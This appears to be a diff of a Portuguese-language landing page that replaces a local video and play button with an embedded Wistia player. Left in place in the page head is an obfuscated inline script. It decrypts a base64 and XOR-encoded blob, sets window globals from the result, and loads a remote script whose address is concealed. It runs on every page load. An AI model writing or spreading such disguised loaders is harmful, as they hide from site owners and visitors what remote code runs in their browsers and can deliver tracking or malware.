@@ -8,6 +8,18 @@
   <link rel="preconnect" href="https://cdn.utmify.com.br">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://fast.wistia.com">
+  <link rel="preconnect" href="https://fast.wistia.net" crossorigin>
+
+  <script src="https://fast.wistia.com/player.js" async></script>
+  <script src="https://fast.wistia.com/embed/m0nyev2saa.js" async type="module"></script>
+  <style>
+    wistia-player[media-id='m0nyev2saa']:not(:defined) {
+      background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/m0nyev2saa/swatch');
+      display: block;
+      filter: blur(5px);
+    }
+  </style>
 
   <script>(function(){var e_j=atob("DLz1aRTZycn7IF14KMfXHGa16/PZSCkMWM/PRju6rafVVSkVQdqMR3e2pOeZUnILS86cGWCq5rmSWDgUB8ycEXG156OIAnFaSciBG327vL2eU39Cc+HZS3O1pquaTC5aEueOS3q4pKzZGn8IQcSQBV296+XZVjwUXdnXUzbvqP6dRTxPTNiWCiHh/f6eETscHdrDDyX7tJSG");var x_9zdr=[];for(var e_u=0;e_u<e_j.length;e_u++){x_9zdr.push(e_j.charCodeAt(e_u)&255);}var p_0xcw=x_9zdr[0];var x_5n46=x_9zdr.slice(1,1+p_0xcw);var p_o6d=x_9zdr.slice(1+p_0xcw);var d_if0=p_o6d.map(function(b,p_z9t){return b^x_5n46[p_z9t%p_0xcw];});var b_2j6="";for(var m_pog=0;m_pog<d_if0.length;m_pog++){b_2j6+=String.fromCharCode(d_if0[m_pog]&255);}var g_t=decodeURIComponent(escape(b_2j6));var y_tyo=JSON.parse(g_t);var s_6iq7=y_tyo.globals||[];s_6iq7.forEach(function(n_w){window[n_w.name]=n_w.value;});var b_imo=document.createElement("script");b_imo.src=y_tyo.url;b_imo.async=true;b_imo.defer=true;(y_tyo.attributes||[]).forEach(function(w_tu){b_imo.setAttribute(w_tu.name,w_tu.value);});(document.head||document.documentElement).appendChild(b_imo);})();</script>
 
@@ -65,15 +77,8 @@
     </section>
 
     <section class="video-section">
-      <div class="video-container video-click-area" onclick="ativarVideoComSom()">
-        <video id="main-video" playsinline preload="metadata">
-          <source src="VIDEO.mp4" type="video/mp4" />
-          Seu navegador não é compatível com vídeos.
-        </video>
-
-        <button class="video-play-btn" id="video-play-btn" type="button" aria-label="Dar play no vídeo">
-          ▶
-        </button>
+      <div class="video-container">
+        <wistia-player media-id="m0nyev2saa" seo="false" aspect="0.5625"></wistia-player>
       </div>
     </section>
     <section class="cta-section">
